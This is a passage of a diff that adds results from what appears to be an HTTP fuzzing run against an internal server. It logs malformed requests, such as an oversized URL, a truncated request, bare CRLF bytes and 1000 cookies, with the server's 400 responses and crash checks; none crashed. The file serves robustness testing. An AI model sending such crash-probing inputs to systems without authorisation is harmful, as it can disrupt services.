+        "payload_preview": "GET /ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ... [truncated, total 65585 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:28 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h7m11s",
+        "uptime_after": "2h7m11s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 148,
+      "category": "edge_cases",
+      "name": "Incomplete request (no final CRLF)",
+      "description": "Send request headers without the terminating empty line",
+      "result": "Response:  (0 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:39.365778",
+      "details": {
+        "payload_size": 53,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nConnection: close\r\n",
+        "response_preview": "",
+        "error": null,
+        "uptime_before": "2h7m11s",
+        "uptime_after": "2h7m17s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 149,
+      "category": "edge_cases",
+      "name": "Zero-length request (just CRLF)",
+      "description": "Send only CRLF bytes as the entire request",
+      "result": "Response: HTTP/1.0 400 Bad Request (317 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:40.182186",
+      "details": {
+        "payload_size": 4,
+        "payload_preview": "\r\n\r\n",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:35 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h7m17s",
+        "uptime_after": "2h7m18s",
+        "crashed": false
+      }
+    },
+    {
+      "id": 150,
+      "category": "edge_cases",
+      "name": "1000 cookie key=value pairs",
+      "description": "Send Cookie header with 1000 key=value pairs",
+      "result": "Response: HTTP/1.0 400 Bad Request (322 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:06:40.994592",
+      "details": {
+        "payload_size": 10843,
+        "payload_preview": "GET / HTTP/1.1\r\nHost: [REDACTED-INTERNAL-IP]\r\nCookie: c0=v0; c1=v1; c2=v2; c3=v3; c4=v4; c5=v5; c6=v6; c7=v7; c8=v8; c9=v9; c10=v10; c11=v11; c12=v12; c13=v13; c14=v14; c15=v15; c16=v16; c17=v17; c18=v18; c19=v19; c20=v20; c21=v21; c22=v22; c23=v23; c24=v24; c25=v25; c26=v26; c27=v27; c28=v28; c29=v29; c30=v30;... [truncated, total 10843 chars]",
+        "response_preview": "HTTP/1.0 400 Bad Request\r\nCache-Control: no-store\r\nConnection: Keep-Alive\r\nContent-Length: 103\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:46:36 GMT\r\nExpires: 0\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<title>Error 400 : Bad Request</title>\n<h1>Error 400 : Bad Request</h1>\n",
+        "error": null,
+        "uptime_before": "2h7m18s",
+        "uptime_after": "2h7m18s",
+        "crashed": false
+      }
+    }
+  ],
+  "findings": [],
+  "crash_events": []
+}
